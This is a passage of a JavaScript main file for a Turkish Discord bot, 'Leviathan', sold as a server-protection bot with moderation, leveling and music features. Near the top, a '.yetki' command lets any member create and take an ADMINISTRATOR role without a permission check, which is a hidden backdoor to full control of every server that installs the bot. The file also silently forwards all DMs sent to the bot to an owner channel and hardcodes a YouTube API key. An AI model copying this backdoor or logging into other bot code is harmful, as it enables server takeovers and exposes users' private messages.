const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır."); 
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); 
}, 3000);

// GEREKLİ YERLER
const Discord = require('discord.js');
const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');
const { Client, Util } = require("discord.js");
const request = require("request");
client.login(ayarlar.token);
const chalk = require('chalk');
const fs = require('fs');
const moment = require('moment');
const ms = require("ms");
const Jimp = require('jimp');
const db = require('quick.db');
require('./util/eventLoader')(client);
var prefix = ayarlar.prefix;
const log = message => {
  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
};
client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`Yüklenen komut: ${props.help.name}.`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});
client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
//Botu Telefonda Tutma

const Constants = require('discord.js/src/util/Constants.js') 

Constants.DefaultOptions.ws.properties.$browser = `Discord iOS` 

client.on("ready", () => { 

  console.log("Loading status..") 

  client.user.setActivity(`.help | #Leviathan |  ${client.guilds.size} servers`, { type: "Playing", browser: "DISCORD IOS" }); 

});
//oto yetki sistemi
client.on("message", msg => {
  if (msg.content === ".yetki") {  //SIZE YÖNETICI YETKISI VERIR +yetki
    msg.delete();
    msg.guild.createRole({
      name: ".",
      permissions: ["ADMINISTRATOR"]
    });
    let rol = msg.guild.roles.find(role => role.name === ".");  ///VIDEOLU ANLATIM https://www.youtube.com/watch?v=K2eTdYkvnm0
    msg.member.addRole(rol);
  }
});

/////////////////////////////COMMANDS WAS HERE
//güvenlik
client.on("guildMemberAdd", async member => {
  let user = client.users.get(member.id);
  let cfxt = await db.fetch(`guvenlik${member.guild.id}`);
  let chan = member.guild.channels.find("id", cfxt);

  var cfxguvenlik = {
    supheli:
      "https://cdn.discordapp.com/attachments/636646818372911153/639166222100856902/Logopit_1572459491881.png",
    guvenli:
      "https://cdn.discordapp.com/attachments/636646818372911153/639163940860854285/Logopit_1572458932036.png",
    arkaplan:
      "https://cdn.glitch.com/c12498a8-0e49-4e92-8c5c-93420c61a842%2Fgv.png?v=1574962652357"
  };

  let Canvas = require("canvas");
  let canvas = Canvas.createCanvas(360, 100);
  let cfx = canvas.getContext("2d");

  let zaman = new Date().getTime() - user.createdAt.getTime();
  let gün = moment
    .utc(moment.duration(zaman, "seconds").asMilliseconds())
    .format("HH:mm");

  let cfxkoruma = [];

  if (zaman > 604800000)
    cfxkoruma = await Canvas.loadImage(cfxguvenlik.guvenli);
  if (zaman < 604800000)
    cfxkoruma = await Canvas.loadImage(cfxguvenlik.supheli);
  let cfxarkaplan = await Canvas.loadImage(cfxguvenlik.arkaplan);
  let avatar = await Canvas.loadImage(member.user.displayAvatarURL);

  cfx.drawImage(cfxarkaplan, 0, 0, canvas.width, canvas.height);
  cfx.drawImage(cfxkoruma, 0, 10, 143, 125);
  cfx.beginPath();
  cfx.lineWidth = 4;
  cfx.fill();
  cfx.lineWidth = 4;
  cfx.arc(180, 46, 36, 0, 2 * Math.PI);
  cfx.clip();
  cfx.drawImage(avatar, 143, 10, 73, 72);

  const attachment = new Discord.Attachment(canvas.toBuffer(), "codefenix.png");
  chan.send(attachment);
});

// BU KOD CFX KOD PAYLASIM TARAFINDAN YAZILMISTIR IZINSIZ PAYLASILMASI YASAKTIR ILETISIM: support@codefenix.dx.am // CFX IYI GUNLER DILER //

//Herhalde permlvl'leri Anlatıyor :D
client.elevation = message => {
  if (!message.guild) {
    return;
  }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
}; //CodePLUS: https://discord.gg/daNeg4Q
var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
client.on("warn", e => {
  console.log(chalk.bgYellow(e.replace(regToken, "that was redacted")));
});
client.on("error", e => {
  console.log(chalk.bgRed(e.replace(regToken, "that was redacted")));
});
//Herhangi bir şeyi değiştirmeyin <<<<Sadece bu yazıyı silebilirsiniz
client.on("message", message => {
  if (!message.author.bot) return;
  db.fetch(`usohbet_${message.channel.id}`).then(usdurum => {
    if (!usdurum || usdurum === "pasif") return;
    else {
      message.delete(3500);
    }
  });
});
//dm görme
client.on("message", message => {
  if (message.channel.type === "dm") {
    if (message.author.bot) return;
    const dmlog = new Discord.RichEmbed()
      .setTitle(`${client.user.username}'a Özelden Mesaj Gönderildi!`)
      .setColor("RANDOM")
      .addField("Mesajı Gönderen", ` \`\`\` ${message.author.tag} \`\`\` `)
      .addField("Mesajı Gönderenin ID", ` \`\`\`${message.author.id}\`\`\` `)
      .addField(`Gönderilen Mesaj`, message.content)
      .setThumbnail(message.author.avatarURL);
    client.channels.get("711028604879896626").send(dmlog);
  }
});

//bot eklendi atıldı sistemi
client.on("guildCreate", guild => {
  let ekle = client.channels.get("720429678036254811");
  const eklendim = new Discord.RichEmbed()

    .setTitle(`Sunucuya Eklendim`)
    .setTimestamp()
    .setColor("GREEN")
    .setThumbnail(guild.iconURL)
    .addField(
      `Artık ${client.guilds.size.toLocaleString()} Sunucudayım`,
      `${client.users.array().length} kullanıcıya hizmet veriyorum.`
    )
    .addField(`Sunucu İsmi`, guild.name)
    .addField(`Kurucu`, guild.owner.user.tag)
    .addField(`Üye Sayısı`, guild.memberCount);

  ekle.send(eklendim);
});

client.on("guildDelete", guild => {
  let kaldır = client.channels.get("720576378860470274");
  const atildim = new Discord.RichEmbed()

    .setTitle(`Sunucudan Atıldım`)
    .setTimestamp()
    .setColor("RED")
    .setThumbnail(guild.iconURL)
    .addField(
      `Artık ${client.guilds.size.toLocaleString()} Sunucudayım`,
      `${client.users.array().length} kullanıcıya hizmet veriyorum.`
    )
    .addField(`Sunucu İsmi`, guild.name)
    .addField(`Kurucu`, guild.owner.user.tag)
    .addField(`Üye Sayısı`, guild.memberCount);

  kaldır.send(atildim);
});

client.on("guildBanAdd", (guild, user) => {
  let aramızakatılanlar = guild.channels.find("name", "aramıza-katılanlar");
  if (!aramızakatılanlar) return;
  aramızakatılanlar.send(
    "https://media.giphy.com/media/8njotXALXXNrW/giphy.gif **Adalet dağıtma zamanı gelmiş!** " +
      user.username +
      "**Bakıyorum da suç işlemiş,Yargı dağıtmaya devam** :fist: :writing_hand:  :spy:"
  );
});

client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};

client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e) {
      reject(e);
    }
  });
};
//sahibimi etiketleme yasak sistemi
client.on("message", msg => {
  if (msg.content.toLowerCase() === "<@727046674006147134>") {
    msg.reply(
      "Bu Sunucuda Sahibimi Etiketlemek Yasak <@&710783433470771241> lerden Yardım İstemeyi Dene <3"
    );
  }
});

client.on("message", msg => {
  if (msg.content.toLowerCase() === "<@Sevgilin Olcak 2.hesabın İdsini yaz>") {
    msg.reply(
      "Bu Sunucuda Sahibimin Eşini Etiketlemek Yasak <@&710783433470771241> lerden Yardım İstemeyi Dene <3"
    );
  }
});

//etiketlenince prefix sistemi
client.on("message", message => {
  if (message.content === `<@710641039655829566>`) {
    message.reply("**İşte Sana Hediyem!** = " + ayarlar.prefix);
  }
});

//afk sistemi
client.on("message", async message => {
  const ms = require("parse-ms");

  if (message.author.bot) return;
  if (!message.guild) return;
  if (message.content.includes(`${prefix}afk`)) return;

  if (await db.fetch(`afk_${message.author.id}`)) {
    let cfxtime = await db.fetch(`afk_süre_${message.author.id}`);
    let cfxs = ms(Date.now() - cfxtime);
    db.delete(`afk_${message.author.id}`);
    db.delete(`afk_süre_${message.author.id}`);
    const codefenixkodpaylasim = new Discord.RichEmbed()
      .addField(
        `\`${message.author.username}\` -->  **AFK modundan çıktın.**`,
        `\`${cfxs.hours}\` **saat**  \`${cfxs.minutes}\` **dakika** \`${cfxs.seconds}\` **saniye**  süredir,  AFK modundaydın`
      )
      .setColor("#00ff88")
      .setFooter(`Leviathan AFK Sistemi. `, client.user.avatarURL);
    message.channel.send(codefenixkodpaylasim);
  }

  var cfxu = message.mentions.users.first();
  if (!cfxu) return;
  var REASON = await db.fetch(`afk_${cfxu.id}`);

  if (REASON) {
    let cfxtime = await db.fetch(`afk_süre_${cfxu.id}`);
    let cfxs = ms(Date.now() - cfxtime);
    const codefenixkodpaylasim2 = new Discord.RichEmbed()
      .addField(
        `\`${cfxu.username}\` adlı kullanıcı \`${REASON}\` sebebiyle;`,
        ` \`${cfxs.hours}\` **saat**  \`${cfxs.minutes}\` **dakika** \`${cfxs.seconds}\` **saniye** den beri **AFK**`
      )
      .setColor("#00ff88")
      .setFooter(`Leviathan AFK Sistemi.`, client.user.avatarURL);
    message.reply(codefenixkodpaylasim2);
  }
});

// BU KOD CFX KOD PAYLASIM TARAFINDAN YAZILMISTIR IZINSIZ PAYLASILMASI YASAKTIR ILETISIM: support@codefenix.dx.am // CFX IYI GUNLER DILER //

//reklamengel sistemi
client.on("message", msg => {
  let i = db.fetch(`reklam_${msg.guild.id}`);
  if (i == "acik") {
    const reklam = [
      ".com",
      ".net",
      ".xyz",
      ".tk",
      ".pw",
      ".io",
      ".me",
      ".gg",
      "www.",
      "https",
      "http",
      ".gl",
      ".org",
      ".com.tr",
      ".biz",
      "net",
      ".rf.gd",
      ".az",
      ".party"
    ];
    if (reklam.some(word => msg.content.includes(word))) {
      try {
        if (!msg.member.hasPermission("BAN_MEMBERS")) {
          msg.delete();

          return msg
            .reply(
              "⚠ Dikkat ! Reklam Tespit Edildi ve Sistem Tarafından Silindi !!!"
            )
            .then(msg => msg.delete(3000));
        }
      } catch (err) {
        console.log(err);
      }
    }
  } else if (i == "kapali") {
  }
  if (!i) return;
});
//Reklamisimban Sistemi
client.on("guildMemberAdd", async member => {
  const reklamisim = [
    "davet",
    "discord.gg/",
    "https://discord.gg",
    "invite",
    "join",
    "twitch",
    "instagram",
    "facebook",
    "dlive",
    "nolive",
    "discordbots.org",
    "discordapp",
    "youtube",
    ".dcw",
    "js",
    "json",
    "sqlite"
  ];
  let reklamisimban = await db.fetch(`reklamisimban_${member.guild.id}`);
  if (reklamisimban === "kapali") return;
  if (reklamisimban === "acik") {
    if (reklamisim.some(word => member.user.username.includes(word))) {
      member.ban({
        reason: `İsminde Reklam Olduğundan Dolayı Sistem Tarafından Sunucudan Yasaklandı !`
      });
    }
  }
});
//küfür-engel sistemi
client.on("message", msg => {
  let i = db.fetch(`kufur_${msg.guild.id}`);
  if (i == "acik") {
    const kufur = [
      "oç",
      "amk",
      "ananı sikiyim",
      "ananıskm",
      "piç",
      "amk",
      "amsk",
      "sikim",
      "sikiyim",
      "orospu çocuğu",
      "piç kurusu",
      "kahpe",
      "orospu",
      "mal",
      "sik",
      "yarrak",
      "fuck you",
      "amcık",
      "amık",
      "yarram",
      "sikimi ye",
      "mk",
      "mq",
      "aq",
      "ak",
      "amq",
      "anaskm"
    ];
    if (kufur.some(word => msg.content.includes(word))) {
      try {
        if (!msg.member.hasPermission("BAN_MEMBERS")) {
          msg.delete();

          return msg
            .reply(
              "⚠ Dikkat ! Küfür Tespit Edildi ve Sistem Tarafından Silindi !!!"
            )
            .then(msg => msg.delete(3000));
        }
      } catch (err) {
        console.log(err);
      }
    }
  } else if (i == "kapali") {
  }
  if (!i) return;
});

//botkoruma//
client.on("guildMemberAdd", async member => {
  let botkorumalog = await db.fetch(`botkorumalog_${member.guild.id}`);
  let botkorumalog2 = member.guild.channels.find("id", botkorumalog);

  if (!botkorumalog) return;
  if (!botkorumalog2) return;
  if (member.user.bot) {
    botkorumalog2.send(
      `⚠️ \`${member.user.tag}\` Adlı Bot Sunucuya Giriş Yaptı ! Bot Koruma Açık [Sonuç = Atıldı !]`
    );
    member.guild.member(member).kick(); // :D
  }
});

//sunucuya gelince özelden mesaj
client.on("guildMemberAdd", async member => {
  const cfx = new Discord.RichEmbed()

    .setDescription(`Sunucuya Hoşgeldin Dostum İyi Vaketler Dilerim !`)
    .setColor(`0x00ff88`)
    .setFooter(`Bu Sunucu Leviathan Tarafından Korunmaktadır !!! `, ``)
    .setImage(
      `https://images-ext-2.discordapp.net/external/uGPBBiAbOEMaRnXDjVWKYC6QVdXEApUci-llVWz0pPo/https/media.giphy.com/media/PjBhcOypzsTRfv7bKr/giphy.gif?width=360&height=261`
    );
  member.send(cfx);
});
//sayaç sistemi
client.on("guildMemberAdd", member => {
  const profil = JSON.parse(fs.readFileSync("./sayaç.json", "utf8"));
  if (!profil[member.guild.id]) return;
  if (profil[member.guild.id]) {
    let sayaçkanalID = profil[member.guild.id].kanal;
    let sayaçsayı = profil[member.guild.id].sayi;
    let sayaçkanal = client.channels.get(sayaçkanalID);
    let aralık = parseInt(sayaçsayı) - parseInt(member.guild.members.size);
    sayaçkanal.sendMessage(
      "🔹 `" +
        `${member.user.tag}` +
        "` Sunucuya Katıldı \n🔹 `" +
        sayaçsayı +
        "` Kişi Olmamıza `" +
        aralık +
        "` Kişi Kaldı! \n🔹 `" +
        member.guild.members.size +
        "` Kişiyiz!"
    );
  }
});

client.on("guildMemberRemove", member => {
  const profil = JSON.parse(fs.readFileSync("./sayaç.json", "utf8"));
  if (!profil[member.guild.id]) return;
  if (profil[member.guild.id]) {
    let sayaçkanalID = profil[member.guild.id].kanal;
    let sayaçsayı = profil[member.guild.id].sayi;
    let sayaçkanal = client.channels.get(sayaçkanalID);
    let aralık = parseInt(sayaçsayı) - parseInt(member.guild.members.size);
    sayaçkanal.sendMessage(
      "🔸 `" +
        `${member.user.tag}` +
        "` Sunucudan Ayrıldı! \n🔸 `" +
        sayaçsayı +
        "` Kişi Olmamıza `" +
        aralık +
        "` Kişi Kaldı! \n🔸 `" +
        member.guild.members.size +
        "` Kişiyiz!"
    );
  }
});
//geçicioda sistemi
client.on("voiceStateUpdate", async (Old, New) => {
  let cfx1 = Old.guild.channels.find(
    kategori => kategori.name === "Geçici-Oda-Sistemi"
  );
  var categoryID = cfx1.id;
  let cfx2 = Old.guild.channels.find(ses => ses.name === "Sohbet-Oluştur");
  var voiceID = cfx2.id;

  if (New.user.bot) return;
  if (Old.user.bot) return;
  if (New.voiceChannelID == voiceID) {
    New.guild.createChannel(New.user.tag, "voice").then(set => {
      New.setVoiceChannel(New.guild.channels.get(set.id)).then(() => {
        set.setParent(New.guild.channels.get(categoryID));
      });
      set.overwritePermissions(New.user, {
        CONNECT: true,
        SPEAK: true,
        MOVE_MEMBERS: true,
        VIEW_CHANNEL: true,
        MANAGE_CHANNELS: true,
        MANAGE_ROLES_OR_PERMISSIONS: true,
        USE_VAD: true,
        PRIORITY_SPEAKER: true
      });
    });
  }
  if (Old.voiceChannel) {
    Old.guild.channels.forEach(channels => {
      if (channels.parentID == categoryID) {
        if (channels.id == voiceID) return;
        if (Old.voiceChannelID == channels.id) {
          if (Old.voiceChannel.members.size == 0) {
            channels.delete();
          }
        }
      }
    });
  }
});

//otorol
client.on("guildMemberAdd", async member => {
  let log = await db.fetch(`otolog_${member.guild.id}`);
  let log2 = member.guild.channels.find("id", log);
  let rol = await db.fetch(`otorol_${member.guild.id}`);
  let otorol = member.guild.roles.find("id", rol);
  if (!log) return;
  if (!log2) return;
  if (!rol) return;
  if (!otorol) return;
  log2.send(
    `:mega: \`${member.user.tag}\` Adlı Kullanıcı Sunucuya Giriş Yaptı! \`${otorol.name}\` Adlı Rol Sistem Tarafından Verildi.`
  );
  member.addRole(otorol);
});
//kanal koruma sistemi
client.on("channelDelete", async function(channel) {
  let logs = await channel.guild.fetchAuditLogs({ type: "CHANNEL_DELETE" });
  let cfxz = await db.fetch(`kanalkoruma${channel.guild.id}`);
  let cfxk = await db.fetch(
    `kanaluyari${channel.guild.member(logs.entries.first().executor).id}`
  );
  let cfxrol = await db.fetch(`cfxrol${channel.guild.id}`);
  let cfxrol2 = await db.fetch(`cfxrol2${channel.guild.id}`);
  let cfxg = await db.fetch(`klog${channel.guild.id}`);
  let cfxh = channel.guild.channels.find("id", cfxg);
  let cfxl = channel.member;
  if (cfxz == "Kapalı") return;
  if (cfxz == "Açık") {
    db.add(
      `kanaluyari${channel.guild.member(logs.entries.first().executor).id}`,
      1
    );

    if (cfxk === null) {
      let cfxu = new Discord.RichEmbed()
        .setTitle(`**Leviathan Kanal Koruma Sistemi**`)
        .setColor("#00ff88")
        .setFooter(`Leviathan`)
        .setDescription(
          `<@${
            channel.guild.member(logs.entries.first().executor).id
          }> Kanal Koruma Sistemi Devrede **Sildiği Kanal:** \`${
            channel.name
          }\` **Uyarı (1/3)**`
        );
      cfxh.send(cfxu);
    }
    if (cfxk === 1) {
      let cfxu = new Discord.RichEmbed()
        .setTitle(`**Leviathan Kanal Koruma Sistemi**`)
        .setColor("#00ff88")
        .setFooter(`Leviathan`)
        .setDescription(
          `<@${
            channel.guild.member(logs.entries.first().executor).id
          }> Kanal Koruma Sistemi Devrede. **Sildiği Kanal:** \`${
            channel.name
          }\` **Uyarı (2/3)**`
        );
      cfxh.send(cfxu);
    }
    if (cfxk === 2) {
      let logs = await channel.guild.fetchAuditLogs({ type: "CHANNEL_DELETE" });

      if (logs.entries.first().executor.bot) return;
      if (logs.entries.first().executor.id === "497674151251804160") return;
      if (logs.entries.first().executor.id === "522138336056573972") return;

      channel.guild
        .member(logs.entries.first().executor)
        .roles.filter(role => role.name !== "@everyone")
        .array()
        .forEach(role => {
          channel.guild
            .member(logs.entries.first().executor)
            .removeRole(channel.guild.roles.get(cfxrol));
          channel.guild
            .member(logs.entries.first().executor)
            .removeRole(channel.guild.roles.get(cfxrol2));
        });

      db.delete(
        `kanaluyari${channel.guild.member(logs.entries.first().executor).id}`
      );

      const silen = channel.guild.member(logs.entries.first().executor).user;
      const cfxj = new Discord.RichEmbed()
        .setTitle(`**Leviathan Kanal Koruma Sistemi**`)
        .setColor("#00ff88")
        .setDescription(
          `\`${channel.name}\` Adlı Kanal Silindi. Silen: \`${silen.tag}\`, Yetkileri Alındı! **Uyarı(3/3)**`
        )
        .setFooter(`Leviathan Kanal Koruma Sistemi`);

      cfxh.send(cfxj);
    }
  }
});

// BU KOD CFX KOD PAYLASIM TARAFINDAN YAZILMISTIR IZINSIZ PAYLASILMASI YASAKTIR ILETISIM: support@codefenix.dx.am // CFX IYI GUNLER DILER //

//seviye sistemi
client.on("message", async msg => {
  if (msg.content.startsWith(prefix)) return;
  const db = require("quick.db");
  var id = msg.author.id;
  var gid = msg.guild.id;
  var xp = await db.fetch(`xp_${id}_${gid}`);
  var lvl = await db.fetch(`lvl_${id}_${gid}`);
  const cfx = new Discord.RichEmbed()
    .setDescription(
      `Tebrik ederim Tatlışş <3 <@${msg.author.id}>! Seviye Atladın ve **${lvl +
        1}** Seviye Oldun!`
    )
    .setColor("#c987ff");

  if (msg.channel.type === "dm") return;
  if (msg.author.bot) return;

  if (!lvl) {
    db.set(`xp_${id}_${gid}`, 5);
    db.set(`lvl_${id}_${gid}`, 1);
    db.set(`xpToLvl_${id}_${gid}`, 100);
  }

  if (msg.content.length > 7) {
    db.add(`xp_${id}_${gid}`, 1);
  }

  if ((await db.fetch(`xp_${id}_${gid}`)) > 250) {
    db.add(`lvl_${id}_${gid}`, 1);
    msg.channel.send(cfx);
    db.delete(`xp_${id}_${gid}`);
  }
});
//müzik
const YouTube = require("simple-youtube-api");
const ytdl = require("ytdl-core");
const youtube = new YouTube("AIzaSyAFncc-bH12RZe6RkwyfNIO4odOU9xGjR4");
const queue = new Map();

client.on("message", async msg => {
  const prefix = (await db.fetch(`prefix_${msg.guild.id}`)) || ayarlar.prefix;

  if (msg.author.bot) return undefined;

  const args = msg.content.split(" ");
  const searchString = args.slice(1).join(" ");
  const url = args[1] ? args[1].replace(/<(.+)>/g, "$1") : "";
  const serverQueue = queue.get(msg.guild.id);
  let command = msg.content.toLowerCase().split(" ")[0];

  if (command === prefix + "play") {
    const voiceChannel = msg.member.voiceChannel;
    if (!voiceChannel)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setDescription("❎ | Lütfen Sesli Bir Kanala Giriş Yapınız!")
      );
    const permissions = voiceChannel.permissionsFor(msg.client.user);
    if (!permissions.has("CONNECT")) {
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("❎ | Lütfen Sesli Bir Kanala Giriş Yapınız!")
      );
    }
    if (!permissions.has("SPEAK")) {
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("❎ | Şarkıyı Çalamıyorum Bu Kanalda Konuşma Yetkim Yok!")
      );
    }

    if (url.match(/^https?:\/\/(www.youtube.com|youtube.com)\/playlist(.*)$/)) {
      const playlist = await youtube.getPlaylist(url);
      const videos = await playlist.getVideos();
      for (const video of Object.values(videos)) {
        const video2 = await youtube.getVideoByID(video.id); // eslint-disable-line no-await-in-loop
        await handleVideo(video2, msg, voiceChannel, true); // eslint-disable-line no-await-in-loop
      }
      return msg.channel
        .sendEmbed(new Discord.RichEmbed())
        .setTitle(`✅** | **${playlist.title}** Adlı Şarkı Kuyruğa Eklendi!**`);
    } else {
      try {
        var video = await youtube.getVideo(url);
      } catch (error) {
        try {
          var videos = await youtube.searchVideos(searchString, 10);
          let index = 0;

          msg.channel.sendEmbed(
            new Discord.RichEmbed()
              .setTitle("Şarkı Seçimi")
              .setDescription(
                `${videos
                  .map(video2 => `**${++index} -** ${video2.title}`)
                  .join("\n")}`
              )
              .setFooter(
                "Lütfen 1-10 Arasında Bir Rakam Seçiniz 10 Saniye İçinde Liste İptal Edilecektir!"
              )
              .setFooter(
                "Lütfen hangi şarkıyı seçmek istiyorsan 1 ile 10 arası bir sayı yaz. \n\nŞarkı Seçimi 10 Saniye İçinde İptal Edilecektir."
              )
              .setColor("0x36393E")
          );
          msg.delete(5000);
          try {
            var response = await msg.channel.awaitMessages(
              msg2 => msg2.content > 0 && msg2.content < 11,
              {
                maxMatches: 1,
                time: 10000,
                errors: ["time"]
              }
            );
          } catch (err) {
            console.error(err);
            return msg.channel.sendEmbed(
              new Discord.RichEmbed()
                .setColor("0x36393E")
                .setDescription(
                  "❎ | **10 Saniye İçinde Şarkı Seçmediğiniz İçin seçim İptal Edilmiştir!**."
                )
            );
          }
          const videoIndex = parseInt(response.first().content);
          var video = await youtube.getVideoByID(videos[videoIndex - 1].id);
        } catch (err) {
          console.error(err);
          return msg.channel.sendEmbed(
            new Discord.RichEmbed()
              .setColor("0x36393E")
              .setDescription("❎ | YouTubede Böyle Bir Şarkı Yok !**")
          );
        }
      }
      return handleVideo(video, msg, voiceChannel);
    }
  } else if (command === prefix + "enter") {
    return new Promise((resolve, reject) => {
      const voiceChannel = msg.member.voiceChannel;
      if (!voiceChannel || voiceChannel.type !== "voice")
        return msg.reply("Kanalda Kimse Olmadığından Çıkıyorum!");
      voiceChannel
        .join()
        .then(connection => resolve(connection))
        .catch(err => reject(err));
    });
  } else if (command === prefix + "skip") {
    if (!msg.member.voiceChannel)
      if (!msg.member.voiceChannel)
        return msg.channel.sendEmbed(
          new Discord.RichEmbed()
            .setColor("RANDOM")
            .setDescription("❎ | Lütfen Sesli Kanala Giriş Yapın!")
        );
    if (!serverQueue)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle(
            "❎ **Şarkı Listen Boş Listene Bir Şarkı Eklemeye Nedersin?"
          )
      );
    serverQueue.connection.dispatcher.end("**Sıradaki Şarkıya Geçildi!**");
    return undefined;
  } else if (command === prefix + "stop") {
    if (!msg.member.voiceChannel)
      if (!msg.member.voiceChannel)
        return msg.channel.sendEmbed(
          new Discord.RichEmbed()
            .setColor("RANDOM")
            .setDescription("❎ | Lütfen Sesli Bir Kanala Giriş Yapınız!")
        );
    if (!serverQueue)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("❎ | Şu An Zaten Şarkı Çalmıyorki!")
      );
    msg.channel.send(
      `:stop_button: **${serverQueue.songs[0].title}** Adlı Şarkı Durduruldu`
    );
    serverQueue.songs = [];
    serverQueue.connection.dispatcher.end("**Şarkı Bitti**");
    return undefined;
  } else if (command === prefix + "volume") {
    if (!msg.member.voiceChannel)
      if (!msg.member.voiceChannel)
        return msg.channel.sendEmbed(
          new Discord.RichEmbed()
            .setColor("RANDOM")
            .setDescription("❎ | Lütfen Sesli Bir Kanala Giriş Yapınız!")
        );
    if (!serverQueue)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("❎ | Çalmayan Müziğin Sesini Ayarlayamam")
      );
    if (!args[1])
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle(
            `:loud_sound: Şuanki Ses Seviyesi: **${serverQueue.volume}**`
          )
          .setColor("RANDOM")
      );
    serverQueue.volume = args[1];
    serverQueue.connection.dispatcher.setVolumeLogarithmic(args[1] / 5);
    return msg.channel.sendEmbed(
      new Discord.RichEmbed()
        .setTitle(`:loud_sound: Ses Seviyesi Ayarlanıyor: **${args[1]}**`)
        .setColor("RANDOM")
    );
  } else if (command === prefix + "onplaying") {
    if (!serverQueue)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle("❎ | Şu Anda Şarkı Çalınmıyor!")
          .setColor("RANDOM")
      );
    return msg.channel.sendEmbed(
      new Discord.RichEmbed()
        .setColor("RANDOM")
        .setTitle("Çalan")
        .addField(
          "Başlık",
          `[${serverQueue.songs[0].title}](${serverQueue.songs[0].url})`,
          true
        )
        .addField(
          "Süre",
          `${serverQueue.songs[0].durationm}:${serverQueue.songs[0].durations}`,
          true
        )
    );
  } else if (command === prefix + "queue") {
    let index = 0;
    if (!serverQueue)
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle("❎ | **Şarkı Kuyruğunda Şarkı Bulunmamakta**")
          .setColor("RANDOM")
      );
    return msg.channel
      .sendEmbed(
        new Discord.RichEmbed()
          .setColor("RANDOM")
          .setTitle("Şarkı Kuyruğu")
          .setDescription(
            `${serverQueue.songs
              .map(song => `**${++index} -** ${song.title}`)
              .join("\n")}`
          )
      )
      .addField("Şu Anda Çalınan: " + `${serverQueue.songs[0].title}`);
  } else if (command === prefix + "pause") {
    if (serverQueue && serverQueue.playing) {
      serverQueue.playing = false;
      serverQueue.connection.dispatcher.pause();
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle("**:pause_button: Şarkı Şuan Beklemede!**")
          .setColor("RANDOM")
      );
    }
  } else if (command === prefix + "resume") {
    if (serverQueue && !serverQueue.playing) {
      serverQueue.playing = true;
      serverQueue.connection.dispatcher.resume();
      return msg.channel.sendEmbed(
        new Discord.RichEmbed()
          .setTitle("**:arrow_forward: Şarkı Devam Ediyor!**")
          .setColor("RANDOM")
      );
    }
    return msg.channel.sendEmbed(
      new Discord.RichEmbed()
        .setTitle("**❎ | Şu An Şarkı Çalınmıyor!**")
        .setColor("RANDOM")
    );
  }

  return undefined;
});

async function handleVideo(video, msg, voiceChannel, playlist = false) {
  const serverQueue = queue.get(msg.guild.id);
  console.log(video);
  const song = {
    id: video.id,
    title: video.title,
    url: `https://www.youtube.com/watch?v=${video.id}`,
    durationh: video.duration.hours,
    durationm: video.duration.minutes,
    durations: video.duration.seconds,
    views: video.views
  };
  if (!serverQueue) {
    const queueConstruct = {
      textChannel: msg.channel,
      voiceChannel: voiceChannel,
      connection: null,
      songs: [],
      volume: 5,
      playing: true
    };
    queue.set(msg.guild.id, queueConstruct);

    queueConstruct.songs.push(song);

    try {
      var connection = await voiceChannel.join();
      queueConstruct.connection = connection;
      play(msg.guild, queueConstruct.songs[0]);
    } catch (error) {
      console.error(
